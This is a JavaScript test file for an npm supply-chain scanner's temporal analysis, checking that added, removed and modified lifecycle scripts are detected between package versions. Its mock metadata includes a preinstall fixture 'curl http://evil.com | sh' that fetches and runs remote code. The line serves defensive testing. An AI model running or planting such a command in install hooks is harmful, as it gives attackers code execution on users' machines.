const fs = require('fs');
const path = require('path');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  runScan, runCommand, BIN, TESTS_DIR, addSkipped
} = require('../test-utils');

async function runTemporalAnalysisTests() {
  // ============================================
  // TEMPORAL ANALYSIS TESTS
  // ============================================

  console.log('\n=== TEMPORAL ANALYSIS TESTS ===\n');

  const {
    fetchPackageMetadata,
    getLifecycleScripts,
    compareLifecycleScripts,
    getLatestVersions,
    detectSuddenLifecycleChange
  } = require('../../src/temporal-analysis.js');

  // --- getLifecycleScripts ---

  test('TEMPORAL: getLifecycleScripts returns {} for package.json without scripts', () => {
    const result = getLifecycleScripts({ name: 'foo', version: '1.0.0' });
    assert(Object.keys(result).length === 0, 'Should return empty object');
  });

  test('TEMPORAL: getLifecycleScripts returns {} for non-lifecycle scripts only', () => {
    const result = getLifecycleScripts({
      scripts: { test: 'jest', start: 'node index.js', build: 'tsc' }
    });
    assert(Object.keys(result).length === 0, 'Should return empty object for non-lifecycle scripts');
  });

  test('TEMPORAL: getLifecycleScripts extracts postinstall', () => {
    const result = getLifecycleScripts({
      scripts: { postinstall: 'node setup.js', test: 'jest' }
    });
    assert(Object.keys(result).length === 1, 'Should have exactly 1 key');
    assert(result.postinstall === 'node setup.js', 'Should extract postinstall value');
  });

  test('TEMPORAL: getLifecycleScripts extracts multiple lifecycle scripts', () => {
    const result = getLifecycleScripts({
      scripts: {
        preinstall: 'echo pre',
        postinstall: 'node setup.js',
        prepare: 'npm run build',
        test: 'jest',
        start: 'node .'
      }
    });
    assert(Object.keys(result).length === 3, 'Should have 3 lifecycle scripts');
    assert(result.preinstall === 'echo pre', 'preinstall value');
    assert(result.postinstall === 'node setup.js', 'postinstall value');
    assert(result.prepare === 'npm run build', 'prepare value');
  });

  test('TEMPORAL: getLifecycleScripts handles null/undefined input', () => {
    assert(Object.keys(getLifecycleScripts(null)).length === 0, 'null input');
    assert(Object.keys(getLifecycleScripts(undefined)).length === 0, 'undefined input');
    assert(Object.keys(getLifecycleScripts({})).length === 0, 'empty object');
  });

  test('TEMPORAL: getLifecycleScripts ignores non-string script values', () => {
    const result = getLifecycleScripts({
      scripts: { postinstall: 123, preinstall: 'echo ok' }
    });
    assert(Object.keys(result).length === 1, 'Should ignore numeric value');
    assert(result.preinstall === 'echo ok', 'Should keep string value');
  });

  // --- compareLifecycleScripts ---

  const mockMetadata = {
    versions: {
      '1.0.0': { scripts: { test: 'jest' } },
      '1.1.0': { scripts: { test: 'jest', postinstall: 'node exploit.js' } },
      '1.2.0': { scripts: { test: 'jest', postinstall: 'node safe-setup.js' } },
      '1.3.0': { scripts: { test: 'jest' } },
      '2.0.0': {
        scripts: {
          preinstall: 'curl http://evil.com | sh',
          postinstall: 'node steal.js',
          prepare: 'npm run build'
        }
      }
    }
  };

  test('TEMPORAL: compareLifecycleScripts detects added postinstall', () => {
    const result = compareLifecycleScripts('1.0.0', '1.1.0', mockMetadata);
    assert(result.added.length === 1, 'Should have 1 added script');
    assert(result.added[0].script === 'postinstall', 'Added script should be postinstall');
    assert(result.added[0].value === 'node exploit.js', 'Added script value');
    assert(result.removed.length === 0, 'No removed scripts');
    assert(result.modified.length === 0, 'No modified scripts');
  });

  test('TEMPORAL: compareLifecycleScripts detects removed postinstall', () => {
    const result = compareLifecycleScripts('1.1.0', '1.3.0', mockMetadata);
    assert(result.removed.length === 1, 'Should have 1 removed script');
    assert(result.removed[0].script === 'postinstall', 'Removed script should be postinstall');
    assert(result.removed[0].value === 'node exploit.js', 'Removed script value');
    assert(result.added.length === 0, 'No added scripts');
    assert(result.modified.length === 0, 'No modified scripts');
  });

  test('TEMPORAL: compareLifecycleScripts detects modified postinstall', () => {
    const result = compareLifecycleScripts('1.1.0', '1.2.0', mockMetadata);
    assert(result.modified.length === 1, 'Should have 1 modified script');
    assert(result.modified[0].script === 'postinstall', 'Modified script should be postinstall');
    assert(result.modified[0].oldValue === 'node exploit.js', 'Old value');
    assert(result.modified[0].newValue === 'node safe-setup.js', 'New value');
    assert(result.added.length === 0, 'No added scripts');
    assert(result.removed.length === 0, 'No removed scripts');
  });

  test('TEMPORAL: compareLifecycleScripts returns empty arrays for identical versions', () => {
    const result = compareLifecycleScripts('1.0.0', '1.3.0', mockMetadata);
    assert(result.added.length === 0, 'No added');
    assert(result.removed.length === 0, 'No removed');
    assert(result.modified.length === 0, 'No modified');
  });

  test('TEMPORAL: compareLifecycleScripts detects multiple changes', () => {
    const result = compareLifecycleScripts('1.0.0', '2.0.0', mockMetadata);
    assert(result.added.length === 3, 'Should have 3 added scripts (preinstall, postinstall, prepare)');
    const names = result.added.map(a => a.script).sort();
    assert(names[0] === 'postinstall', 'postinstall added');
    assert(names[1] === 'preinstall', 'preinstall added');
    assert(names[2] === 'prepare', 'prepare added');
  });

  test('TEMPORAL: compareLifecycleScripts throws for missing version', () => {
    let threw = false;
    try {
      compareLifecycleScripts('1.0.0', '9.9.9', mockMetadata);
    } catch (e) {
      threw = true;
      assert(e.message.includes('9.9.9'), 'Error should mention missing version');
    }
    assert(threw, 'Should have thrown for non-existent version');
  });

  test('TEMPORAL: compareLifecycleScripts throws for invalid metadata', () => {
    let threw = false;
    try {
      compareLifecycleScripts('1.0.0', '1.1.0', {});
    } catch (e) {
      threw = true;
      assert(e.message.includes('missing versions'), 'Error should mention missing versions');
    }
    assert(threw, 'Should have thrown for invalid metadata');
  });

  // --- getLatestVersions ---

  const mockMetadataWithTime = {
    versions: {
      '1.0.0': { scripts: { test: 'jest' } },
      '1.1.0': { scripts: { test: 'jest', postinstall: 'node exploit.js' } },
      '1.2.0': { scripts: { test: 'jest' } }
    },
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2023-06-15T00:00:00.000Z',
      '1.0.0': '2020-01-15T00:00:00.000Z',
      '1.1.0': '2021-06-01T00:00:00.000Z',
      '1.2.0': '2023-03-10T00:00:00.000Z'
    }
  };

  test('TEMPORAL: getLatestVersions returns 2 most recent by default', () => {
    const result = getLatestVersions(mockMetadataWithTime);
    assert(result.length === 2, 'Should return 2 versions, got ' + result.length);
    assert(result[0].version === '1.2.0', 'First should be newest: ' + result[0].version);
    assert(result[1].version === '1.1.0', 'Second should be previous: ' + result[1].version);
    assert(result[0].publishedAt === '2023-03-10T00:00:00.000Z', 'Should include publishedAt');
  });

  test('TEMPORAL: getLatestVersions excludes created/modified keys', () => {
    const result = getLatestVersions(mockMetadataWithTime, 10);
    assert(result.length === 3, 'Should return only version entries, got ' + result.length);
    const versions = result.map(r => r.version);
    assert(!versions.includes('created'), 'Should not include created');
    assert(!versions.includes('modified'), 'Should not include modified');
  });

  test('TEMPORAL: getLatestVersions returns [] for missing time', () => {
    assert(getLatestVersions({}).length === 0, 'Empty metadata');
    assert(getLatestVersions({ time: null }).length === 0, 'Null time');
  });

  // --- detectSuddenLifecycleChange (mocked) ---

  test('TEMPORAL: detectSuddenLifecycleChange detects added postinstall (mock)', () => {
    // Directly test the logic by simulating what detectSuddenLifecycleChange does internally
    const mockPkg = {
      versions: {
        '1.0.0': { scripts: { test: 'jest' } },
        '1.1.0': { scripts: { test: 'jest', postinstall: 'node malicious.js' } }
      },
      time: {
        created: '2020-01-01T00:00:00.000Z',
        modified: '2021-01-01T00:00:00.000Z',
        '1.0.0': '2020-01-15T00:00:00.000Z',
        '1.1.0': '2021-01-01T00:00:00.000Z'
      },
      maintainers: [{ name: 'evil', email: 'evil@example.com' }]
    };
    const latest = getLatestVersions(mockPkg, 2);
    const diff = compareLifecycleScripts(latest[1].version, latest[0].version, mockPkg);
    assert(diff.added.length === 1, 'Should detect 1 added script');
    assert(diff.added[0].script === 'postinstall', 'Should be postinstall');
    assert(diff.added[0].value === 'node malicious.js', 'Should have correct value');
  });

  test('TEMPORAL: detectSuddenLifecycleChange single version → not suspicious (mock)', () => {
    const mockSingle = {
      versions: { '1.0.0': { scripts: { test: 'jest' } } },
      time: {
        created: '2020-01-01T00:00:00.000Z',
        modified: '2020-01-01T00:00:00.000Z',
        '1.0.0': '2020-01-01T00:00:00.000Z'
      },
      maintainers: []
    };
    const latest = getLatestVersions(mockSingle, 2);
    assert(latest.length === 1, 'Should have only 1 version');
  });

  // --- fetchPackageMetadata / detectSuddenLifecycleChange (integration, may be skipped in CI) ---

  const skipNetwork = process.env.CI === 'true' || process.env.SKIP_NETWORK === 'true';

  if (!skipNetwork) {
    await asyncTest('TEMPORAL: fetchPackageMetadata fetches lodash metadata', async () => {
      const metadata = await fetchPackageMetadata('lodash');
      assert(metadata && typeof metadata === 'object', 'Should return an object');
      assert(metadata.versions && typeof metadata.versions === 'object', 'Should have versions');
      assert('4.17.21' in metadata.versions, 'Should contain version 4.17.21');
      assert(metadata.name === 'lodash', 'Package name should be lodash');
    });

    await asyncTest('TEMPORAL: fetchPackageMetadata throws for non-existent package', async () => {
      let threw = false;
      try {
        await fetchPackageMetadata('package-qui-nexiste-pas-xyz123-muaddib');
      } catch (e) {
        threw = true;
        assert(e.message.includes('not found'), 'Error should mention not found');
      }
      assert(threw, 'Should have thrown for non-existent package');
    });
  } else {
    console.log('[SKIP] TEMPORAL: fetchPackageMetadata network tests (CI/SKIP_NETWORK)');
    addSkipped(2);
  }
}

module.exports = { runTemporalAnalysisTests };
